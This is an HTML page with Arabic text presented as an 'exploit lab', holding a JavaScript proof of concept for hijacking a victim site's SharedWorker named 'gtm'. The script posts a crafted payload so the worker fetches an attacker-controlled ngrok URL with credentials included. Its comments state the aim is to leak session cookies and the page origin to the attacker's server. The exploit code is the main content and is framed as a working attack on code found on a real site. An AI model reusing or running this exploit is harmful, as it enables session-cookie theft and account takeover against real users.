<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Exploit Lab - SharedWorker Hijacking</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background: #f0f2f5; }
        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-top: 5px solid #d9534f; }
        .terminal { background: #1e1e1e; color: #4af626; padding: 15px; border-radius: 5px; font-family: 'Courier New', Courier, monospace; min-height: 150px; white-space: pre-wrap; margin-top: 20px; }
        .btn { background: #d9534f; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .btn:hover { background: #c9302c; }
        .status { font-weight: bold; color: #d9534f; }
    </style>
</head>
<body>

    <div class="card">
        <h2>مختبر استغلال ثغرة وسيط النقل (SharedWorker)</h2>
        <p>هذه الصفحة تحاكي هجوماً يعتمد على الكود الثاني والثالث المكتشفين في موقع الضحية.</p>
        <p>الحالة: <span id="status" class="status">في انتظار بدء الهجوم...</span></p>
        
        <button class="btn" onclick="startExploit()">بدء عملية التسريب (Exfiltration)</button>

        <div class="terminal" id="console">
> جاري تهيئة بيئة الاختبار...
        </div>
    </div>

    <script>
        const terminal = document.getElementById('console');
        const statusText = document.getElementById('status');

        function log(msg) {
            terminal.innerText += `\n> ${msg}`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        async function startExploit() {
            log("بدء البحث عن SharedWorker باسم 'gtm'...");
            statusText.innerText = "جاري الهجوم...";

            try {
                // 1. محاكاة الكود الثاني: الاتصال بالـ Worker الذي أنشأته الضحية
                // نستخدم اسم الـ Worker "gtm" كما ورد في الكود الأصلي
                const worker = new SharedWorker("", "gtm");
                const port = worker.port;

                port.onmessage = function(e) {
                    log("استجابة من الـ Worker: " + JSON.stringify(e.data));
                };

                port.start();
                log("تم اختطاف قناة الاتصال بالـ SharedWorker بنجاح.");

                // 2. محاكاة الكود الثالث: صياغة الرابط الخبيث (Payload)
                // بناء الرابط كما يفعل الكود الثالث في دالة Dz (Format 6)
                const attackerServer = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev"; // ضع رابط Webhook هنا للاختبار
                const maliciousPayload = {
                    url: attackerServer + "?leak=session_cookies&origin=" + encodeURIComponent(window.location.href),
                    retryIntervals: [0, 1000, 5000], // مستوحى من المصفوفة Uy في الكود الثاني
                    commandType: 0 // مستوحى من الكود الثاني
                };

                log("جاري إرسال الحمولة (Payload) لإجبار الـ Worker على تنفيذ Fetch...");
                
                // 3. التنفيذ: إرسال الرسالة التي ستؤدي لطلب Fetch مع Credentials
                port.postMessage(maliciousPayload);

                log("تم إرسال الطلب بنجاح.");
                log("بسبب 'credentials: include' في كود الضحية، سيتم إرسال الـ Cookies الآن إلى خادم المهاجم.");
                statusText.innerText = "اكتمل الهجوم! تحقق من خادمك.";
                statusText.style.color = "#5cb85c";

            } catch (err) {
                log("خطأ: " + err.message);
                log("تنبيه: المتصفح قد يمنع الوصول العابر للنطاقات (Cross-Origin) للـ SharedWorker.");
                statusText.innerText = "فشل الهجوم (حماية المتصفح).";
            }
        }
    </script>
</body>
</html>
